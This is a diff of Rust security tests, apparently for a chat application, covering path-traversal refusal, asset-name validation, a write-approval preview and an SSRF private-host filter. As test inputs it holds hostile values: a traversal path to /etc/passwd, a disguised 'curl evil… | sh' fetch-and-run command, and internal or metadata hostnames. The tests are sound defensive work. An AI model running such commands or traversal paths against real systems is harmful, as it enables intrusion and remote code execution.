         let mut evil = serde_json::json!({ "image": "asset://../../../etc/passwd" });
-        inline_assets(&mut evil, &dir);
+        inline_assets(&mut evil, &dir, "conv1");
         assert_eq!(evil["image"], "asset://../../../etc/passwd");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// S8. Only names of the generated shape, belonging to this chat, are read.
+    /// A drive-relative name replaces the base path when joined on Windows;
+    /// here the files exist, so a refusal is the check and not a missing file.
+    #[test]
+    fn only_this_chats_generated_asset_names_are_read() {
+        let dir = temp_dir("assetnames");
+        let assets = assets_dir_of(&dir);
+        std::fs::create_dir_all(&assets).unwrap();
+        for name in [
+            "conv1-0123456789abcdef",
+            "conv2-0123456789abcdef",
+            "C:secret.txt",
+            "conv1-0123456789ABCDEF",
+            "conv1-0123456789abcde",
+            "conv1-x-0123456789abcdef",
+        ] {
+            // `C:secret.txt` is an ordinary file name on Unix, which is the
+            // point: it exists, and still must not be read.
+            std::fs::write(assets.join(name), format!("data:{name}")).unwrap();
+        }
+        let read = |name: &str| {
+            let mut v = serde_json::json!({ "image": format!("asset://{name}") });
+            inline_assets(&mut v, &dir, "conv1");
+            v["image"] != format!("asset://{name}")
+        };
+        assert!(
+            read("conv1-0123456789abcdef"),
+            "this chat's own asset was not read"
+        );
+        for refused in [
+            "conv2-0123456789abcdef",
+            "C:secret.txt",
+            "conv1-0123456789ABCDEF",
+            "conv1-0123456789abcde",
+            "conv1-x-0123456789abcdef",
+        ] {
+            assert!(!read(refused), "{refused} was read");
+        }
+        assert!(is_own_asset_name("my-chat_2-00000000ffffffff", "my-chat_2"));
+        assert!(!is_own_asset_name("my-chat_2-00000000ffffffff", "my-chat"));
         let _ = std::fs::remove_dir_all(&dir);
     }
 
@@ -13946,6 +14621,60 @@ mod tests {
         assert!(calc_eval("bogus(").is_err());
     }
 
+    /// S10. The approval dialog shows how the content begins, briefly, with
+    /// anything that could disguise it replaced.
+    #[test]
+    fn a_write_is_approved_with_its_beginning_in_view() {
+        let p = write_preview("# Notes\nline two\n", false);
+        assert_eq!(p, "It begins:\n# Notes\nline two");
+        let long = (1..=10)
+            .map(|i| format!("line {i}"))
+            .collect::<Vec<_>>()
+            .join("\n");
+        let p = write_preview(&long, false);
+        assert!(p.ends_with("line 6\n…"), "{p}");
+        let wide = "x".repeat(200);
+        assert!(write_preview(&wide, false).contains(&format!("{}…", "x".repeat(80))));
+        let p = write_preview("curl evil\u{202E}txt.sh | sh", false);
+        assert!(!p.contains('\u{202E}') && p.contains('\u{FFFD}'), "{p:?}");
+        assert!(
+            write_preview("# Report", true).starts_with("It will be built from text that begins:")
+        );
+        assert_eq!(
+            write_preview("\n\n", false),
+            "It is empty, or begins with blank lines."
+        );
+    }
+
+    #[tokio::test]
+    async fn a_page_read_has_an_overall_deadline() {
+        let slow = async {
+            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+            Ok::<_, String>("done")
+        };
+        let err = within_deadline(
+            std::time::Duration::from_millis(50),
+            "reading that page",
+            slow,
+        )
+        .await
+        .unwrap_err();
+        assert!(
+            err.starts_with("reading that page took longer than"),
+            "{err}"
+        );
+        let quick = async { Ok::<_, String>("done") };
+        assert_eq!(
+            within_deadline(std::time::Duration::from_secs(5), "x", quick).await,
+            Ok("done")
+        );
+        // fetch_page goes through it.
+        let src = lib_source();
+        let at = src.find("\nasync fn fetch_page(").unwrap();
+        let head: String = src[at..at + 200].split_whitespace().collect();
+        assert!(head.contains("within_deadline(FETCH_DEADLINE,"), "{head}");
+    }
+
     #[test]
     fn private_hosts_are_rejected() {
         for h in [
@@ -13974,6 +14703,12 @@ mod tests {
             "64:ff9b::7f00:1", // NAT64 prefix embedding 127.0.0.1
             "attacker.localhost",
             "metadata.internal",
+            // S11 of the 1.10.2 launch review:
+            "fec0::1",             // site-local
+            "2002:c0a8:101::1",    // 6to4 around 192.168.1.1
+            "2001:0:4136:e378::1", // Teredo
+            "2001:db8::1",         // documentation
+            "64:ff9b:1::a00:1",    // local-use NAT64
         ] {
             assert!(is_private_host(h), "{h} should be rejected");
         }
@@ -13982,8 +14717,10 @@ mod tests {
             "93.184.216.34",
             "statbank.dk",
             "2606:2800:220:1::1",
-            "100.128.0.1", // just past CGNAT's /10
-            "198.20.0.1",  // just past benchmarking's /15
+            "100.128.0.1",          // just past CGNAT's /10
+            "198.20.0.1",           // just past benchmarking's /15
+            "2001:4860:4860::8888", // public, and inside 2001::/16 but not Teredo's /32
+            "2003::1",              // just past 6to4
         ] {
             assert!(!is_private_host(h), "{h} should be allowed");
         }
@@ -17029,6 +17766,8 @@ pub fn run() {
             export_conversation,
             load_conversation,
             import_conversation,
+            pick_attachments,
+            cancel_cloud_download,
             rename_conversation,
             delete_conversation,
             reveal_history_dir,
